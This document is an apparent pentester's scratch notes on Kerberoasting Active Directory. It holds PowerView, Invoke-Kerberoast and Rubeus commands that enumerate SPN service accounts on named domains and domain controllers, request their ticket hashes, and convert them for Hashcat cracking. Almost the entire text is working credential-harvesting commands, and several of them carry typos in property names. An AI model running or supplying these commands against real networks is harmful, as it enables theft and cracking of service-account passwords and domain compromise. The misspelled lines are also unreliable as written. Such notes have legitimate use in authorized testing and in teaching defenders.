
.pwdlastset

```

$kerb | %{$_.samaccountmave; write-host $_.pwslastset}
```


```
Kerb | where {$_.samaccountne -eq "admin01"}   | select -property memberof | fl


Look for users with spn, who has a pw most likely to crack.

Get-NetUser -SPN -Domain n.ad.gointerspacel.com -Server 10.1.1.17 | select serviceprincipalne


This works
$kerberoastble = Get-DomainUser -SPN -Server mars.space.ad.gointerspacel.com -Domain cr.n.a.gointerspacel.com


Request hash  with powerview

$kerberoast=Invoke-Kerberoast -Domain soa.ad.gointerspacel.com -Server 1.1.1.38 -OutputFormat Hashcat

.\Rubeus.exe kerberoast /domain:soa.ad.gointerspacel.com /dc:1.1.1.38 | Out-File -Append SOA-SPN_hashes.txt



AFTER RUBUES PORT TO HASHCAT
SAVE RUB OUTPUT AS UTF-8

python Rubeus-to-Hashcat.py -i /home/kali/Desktop/Rubeus-to-Hashcat/SOA-SPN_hashes_utf8.txt -o SOA-SPN-hcat.txt


```

